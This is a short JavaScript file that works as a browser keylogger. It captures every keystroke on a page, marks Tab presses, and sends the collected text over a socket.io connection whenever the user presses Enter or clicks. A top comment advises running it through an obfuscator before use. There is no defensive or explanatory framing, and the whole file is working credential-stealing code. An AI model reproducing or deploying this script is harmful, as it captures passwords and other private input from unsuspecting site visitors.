//
// run uglify-js or some other obfuscator before using
//
(function() {
  var socket = io.connect(window.location);
  var capture = '';
  document.onkeypress = keypress;
  document.onkeydown = keydown;
  document.onclick = onclick;

  function onclick() {
    socket.emit('data', {data: capture});
  }

  function keydown(evt) {
    if (evt.which === 9) {
      capture += '::';
    }
  }

  function keypress(evt) {
    if (evt.which === 13) {
      socket.emit('data', {data: capture});
      capture = '';
    }
    else {
      capture += String.fromCharCode(evt.which);
    }
  }
})();
